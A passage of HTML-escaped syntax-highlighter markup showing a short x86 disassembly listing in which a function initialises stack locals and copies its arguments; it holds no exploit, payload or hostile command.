&lt;span class=&quot;crayon-r &quot;&gt;00401070&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;E&lt;/span&gt;8&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x18&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-6&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401077&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;F&lt;/span&gt;1&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-7&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;0040107E&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;645&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;FD&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-8&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401082&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;645&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;FE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-9&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401086&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;F&lt;/span&gt;5&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0xB&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-10&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;0040108D&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8D85&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;D&lt;/span&gt;0&lt;span class=&quot;crayon-v &quot;&gt;FEFFFF&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x130&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-11&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401093&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8945&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;F&lt;/span&gt;1&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-12&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401096&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8B45&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-13&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;00401099&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8945&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;E&lt;/span&gt;0&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-14&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;0040109C&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8B45&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x8&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-15&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;0040109F&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8945&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;D&lt;/span&gt;0&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-16&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010A2&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8B45&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0C&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0xC&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-17&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010A5&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8945&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;D&lt;/span&gt;8&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x28&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-18&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010A8&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x24&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-19&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010AF&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;C&lt;/span&gt;745&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;D&lt;/span&gt;4&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;00000&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x2C&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x0&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b0da9d4801629585395-20&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010B6&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8B45&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x10&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b0da9d4801629585395-21&quot;&gt;
&lt;span class=&quot;crayon-r &quot;&gt;004010B9&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;8945&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;EC&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;dword&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;ebp&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0x14&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v &quot;&gt;eax&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
